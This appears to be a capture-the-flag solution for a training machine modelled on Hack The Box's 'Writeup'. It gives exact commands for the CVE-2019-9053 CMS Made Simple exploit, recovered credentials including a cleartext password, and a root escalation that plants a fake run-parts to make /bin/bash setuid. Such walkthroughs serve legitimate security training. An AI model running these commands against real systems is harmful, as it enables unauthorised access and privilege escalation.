# Writeup Solution

This challenge mirrors the original Hack The Box Writeup path.

1. Scan the target. HTTP is on port 80 and SSH is on port 22.
2. Visit `/robots.txt` and find the hidden `/writeup/` path.
3. View the `/writeup/` source and identify `CMS Made Simple`.
4. Use CVE-2019-9053 against `/writeup/`:

   ```bash
   python 46635.py -u http://TARGET/writeup/ --crack -w rockyou.txt
   ```

   Expected recovered values:

   ```text
   Salt: 5a599ef579066807
   Username: jkr
   Email: jkr@writeup.htb
   Password hash: 62def4866937f08cc13bab43bb14e6f7
   Password: raykayjay9
   ```

5. SSH as `jkr`:

   ```bash
   ssh jkr@TARGET
   ```

6. Notice `jkr` is in the `staff` group and can write to `/usr/local/bin`.
7. SSH login runs MOTD generation with a PATH where `/usr/local/bin` is searched before `/bin`.
8. Drop a fake `run-parts` into `/usr/local/bin`:

   ```bash
   cat > /usr/local/bin/run-parts <<'EOF'
   #!/bin/sh
   chmod 4755 /bin/bash
   EOF
   chmod +x /usr/local/bin/run-parts
   ```

9. Start a second SSH session as `jkr`, then run:

   ```bash
   /bin/bash -p
   cat /root/root.txt
   ```

The value in `/root/root.txt` is the per-player flag generated by the CyberRange platform.
